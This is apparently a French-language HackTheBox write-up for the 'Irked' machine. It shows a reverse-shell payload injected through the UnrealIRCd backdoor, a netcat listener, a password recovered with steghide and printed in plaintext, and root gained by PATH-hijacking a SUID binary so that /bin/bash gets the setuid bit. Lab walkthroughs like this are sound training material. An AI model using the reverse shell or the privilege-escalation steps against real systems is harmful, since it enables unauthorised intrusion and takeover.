---
title: HTB | Irked
description: Irked is a pretty simple and straight-forward box which requires basic enumeration skills. It shows the need to scan all ports on machines and to investigate any out of the place binaries found while enumerating a system.
slug: irked-htb
date: 2025-02-16 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Irked cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Irked</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.117</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## System info
```bash
ircd@irked:/home/djmardov/Documents$ uname -a
Linux irked 3.16.0-6-686-pae #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08) i686 GNU/Linux
ircd@irked:/home/djmardov/Documents$ lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 8.10 (jessie)
Release:        8.10
Codename:       jessie
```

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -An -T4 -vvv -p- 10.10.10.117
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAI+wKAAyWgx/P7Pe78y6/80XVTd6QEv6t5ZIpdzKvS8qbkChLB7LC+/HVuxLshOUtac4oHr/IF9YBytBoaAte87fxF45o3HS9MflMA4511KTeNwc5QuhdHzqXX9ne0ypBAgFKECBUJqJ23Lp2S9KuYEYLzUhSdUEYqiZlcc65NspAAAAFQDwgf5Wh8QRu3zSvOIXTk+5g0eTKQAAAIBQuTzKnX3nNfflt++gnjAJ/dIRXW/KMPTNOSo730gLxMWVeId3geXDkiNCD/zo5XgMIQAWDXS+0t0hlsH1BfrDzeEbGSgYNpXoz42RSHKtx7pYLG/hbUr4836olHrxLkjXCFuYFo9fCDs2/QsAeuhCPgEDjLXItW9ibfFqLxyP2QAAAIAE5MCdrGmT8huPIxPI+bQWeQyKQI/lH32FDZb4xJBPrrqlk9wKWOa1fU2JZM0nrOkdnCPIjLeq9+Db5WyZU2u3rdU8aWLZy8zF9mXZxuW/T3yXAV5whYa4QwqaVaiEzjcgRouex0ev/u+y5vlIf4/SfAsiFQPzYKomDiBtByS9XA==
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDGASnp9kH4PwWZHx/V3aJjxLzjpiqc2FOyppTFp7/JFKcB9otDhh5kWgSrVDVijdsK95KcsEKC/R+HJ9/P0KPdf4hDvjJXB1H3Th5/83gy/TEJTDJG16zXtyR9lPdBYg4n5hhfFWO1PxM9m41XlEuNgiSYOr+uuEeLxzJb6ccq0VMnSvBd88FGnwpEoH1JYZyyTnnbwtBrXSz1tR5ZocJXU4DmI9pzTNkGFT+Q/K6V/sdF73KmMecatgcprIENgmVSaiKh9mb+4vEfWLIe0yZ97c2EdzF5255BalP3xHFAY0jROiBnUDSDlxyWMIcSymZPuE1N6Tu8nQ/pXxKvUar
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFeZigS1PimiXXJSqDy2KTT4UEEphoLAk8/ftEXUq0ihDOFDrpgT0Y4vYgYPXboLlPBKBc0nVBmKD+6pvSwIEy8=
|   256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC6m+0iYo68rwVQDYDejkVvsvg22D8MN+bNWMUEOWrhj
80/tcp    open  http    syn-ack Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34862/tcp   status
|   100024  1          41825/tcp6  status
|   100024  1          46351/udp   status
|_  100024  1          49135/udp6  status
6697/tcp  open  irc     syn-ack UnrealIRCd
8067/tcp  open  irc     syn-ack UnrealIRCd
34862/tcp open  status  syn-ack 1 (RPC #100024)
65534/tcp open  irc     syn-ack UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Foothold

### Exploit: UnrealIRCd
```bash
┌──(kali㉿kali)-[~]
└─$ nc -nv 10.10.10.117 6697
(UNKNOWN) [10.10.10.117] 6697 (ircs-u) open
:irked.htb NOTICE AUTH :*** Looking up your hostname...
AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.27 1337 >/tmp/f
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead

------------------------------------------

┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.16.19] from (UNKNOWN) [10.10.10.117] 53736
bash: cannot set terminal process group (625): Inappropriate ioctl for device
bash: no job control in this shell
ircd@irked:~/Unreal3.2$ whoami
whoami
pwdircd
ircd@irked:~/Unreal3.2$ 
pwd
/home/ircd/Unreal3.2
ircd@irked:~/Unreal3.2$ python3 -V
python3 -V
Python 3.4.2
ircd@irked:~/Unreal3.2$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
ircd@irked:~/Unreal3.2$ export TERM=xterm
export TERM=xterm
ircd@irked:~/Unreal3.2$ ^Z
zsh: suspended  nc -lnvp 1337
                                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg                   
[1]  + continued  nc -lnvp 1337

ircd@irked:~/Unreal3.2$ 
ircd@irked:~/Unreal3.2$ whoami
ircd
```

## ircd -> djmardov

### .backup - password
On trouve un fichier .backup dans les documents du user djmardov, avec un mot de passe :
```bash
ircd@irked:/home/djmardov/Documents$ cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

### steg hide
On trouve le mot "steg" et "pw" dans le fichier .backup. On suppose qu'il faut faire la stegano sur une image. La seule image disponible sur le serveur est celle du site web, dans /var/www/html/irked.jpg. On utilise l'outil steg hide pour extraire une string de l'image en utilsant le mot de passe fournit, et ça fonctionne, on recupere le mot de passe de djmardov:
```bash
┌──(kali㉿kali)-[~/htb/Irked]
└─$ steghide extract -p UPupDOWNdownLRlrBAbaSSss -sf ./irked.jpg
wrote extracted data to "pass.txt".

┌──(kali㉿kali)-[~/htb/Irked]
└─$ cat pass.txt   
Kab6h+m+bbp2J:HG
```

### SSH djmardov - user flag
```bash
┌──(kali㉿kali)-[~/htb/Irked]
└─$ ssh djmardov@irked.htb 
The authenticity of host 'irked.htb (10.10.10.117)' can't be established.
ED25519 key fingerprint is SHA256:Ej828KWlDpyEOvOxHAspautgmarzw646NS31tX3puFg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yzqs
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added 'irked.htb' (ED25519) to the list of known hosts.
Kab6h+m+bbp2J:HG
djmardov@irked.htb's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
djmardov@irked:~$ whoami
djmardov
djmardov@irked:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
djmardov@irked:~$ cat user.txt 
0d95.....9a07
```

## Privilege Escalation

### SUID binary: viewuser
Après avoir executé linpeas, on observe un SUID binary suspect : /usr/bin/viewuser. Et oui, fallait remarquer ça...
En regardant de plus près, on remarque qu'il existe la commande "who" sans utiliser de chemin absolu. On ajoute donc au PATH le dossier /tmp puis on crée un fichier avec une commande pour mettre le bit SUID sur /bin/bash et pour executer bash -p en tant que root directement. On aurait pu mettre potentiellement /bin/bash directement dans who egalement.

Dans les write up, on remarque plutot l'utilisation du fichier /tmp/listusers avec un /bin/bash dedans, tout simplemment ! car on a un setuid(0); system('/tmp/listusers') dans le binaire. On remarque qu'il n'y a pas de setuid(0) avant le system('who')... Donc je ne vois pas comment mon exploit fonctionne, pourtant ça fonctionne bien !
```bash
bash-4.3# echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
bash-4.3# export PATH=/tmp:$PATH
bash-4.3# echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

------------------------

nano /tmp/who ---->

chmod +s /bin/bash

-------------------------------

djmardov@irked:~$ /usr/bin/viewuser 
This application is being devleoped to set and test user permissions
It is still being actively developed
sh: 1: /tmp/listusers: Permission denied
djmardov@irked:~$ bash -p
bash-4.3# whoami
root
bash-4.3# cat /root/root.txt
259a.....a166
```